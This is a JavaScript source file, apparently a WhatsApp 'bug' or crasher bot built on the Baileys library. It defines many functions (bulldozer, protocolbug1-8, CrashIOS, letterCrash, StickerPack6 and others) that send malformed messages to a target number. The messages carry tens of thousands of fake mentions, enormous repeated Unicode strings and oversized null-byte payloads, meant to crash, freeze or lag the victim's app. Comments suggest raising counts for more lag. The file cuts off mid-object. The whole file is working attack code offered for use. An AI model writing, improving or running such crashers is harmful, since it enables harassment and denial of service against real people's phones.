const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, generateMessageTag, generateMessageID, Header 
} = require("@whiskeysockets/baileys");

const crypto = require('crypto')
let client;

//=============== INVISIBLE BUG  =============== \\
async function bulldozer(client, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 30000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function invisxaudio(client, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "X" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function invisxlocation(client, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

//=============== PROTOCOL BUG  =============== \\
async function protocolbug1(client, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "\u0000" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "\u0000"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "\u0000" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(client, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u9999",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "\u9999" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(client, target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function protocolbug5(client, target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Rizxvelz Official" + "ោ៝".repeat(10000),
        title: "Api.Crash.RizxVelz",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363319314627296@newsletter",
            serverMessageId: 1,
            newsletterName: "x!s - rizxvelz"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolbug6(client, target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "x!s - rizxvelz",
              newsletterJid: "120363319314627296@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await client.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function protocolbug7(client, target, mention) {
   const mentionedJids = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
        )
    ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "1@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃".repeat(99)
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await client.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await client.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function protocolbug8(client, target, mention) {
  const photo = {
    image: imgCrL,
    caption: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 100, // ubah ke 600 kalau lebih lag
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: client.waUploadToServer
  });

  await client.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) { // ubah ke 666 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 700000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "RizxVelz Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await client.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

//=============== IOS BUG  =============== \\
async function CrashIOS(client, target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await client.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃          " + IphoneCrash,
                                           url: "https://youtube.com/@RizxxWangsaff1205"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }
           
async function NewStellarStuck(client, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "—!s` RizxVelz🐉" + "ꦾ".repeat(120000),
                                jpegThumbnail: renlol,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await client.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
        
//=============== BLANK BUG  =============== \\
async function invico2(client, target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "⎋" + "ោ៝".repeat(10000),
      caption: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await client.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function letterCrash(client, target, Ptcp = true) {
  let virtex = "*🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃͢*" + "ꦾ".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363319314627296@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await client.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}

async function StickerPack6(client, target) {
let memeknya = "ꦾ".repeat(50000) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
  stickerPackMessage: {
    stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
    name: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + memeknya,
    publisher: memeknya + `ꦾ`.repeat(5000),
    stickers: [
      {
        fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      },
      {
        fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      }
    ],
    fileLength: "69832",
    fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
    fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
    mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
    directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
    contextInfo: {},
    mediaKeyTimestamp: "1746459896",
    trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
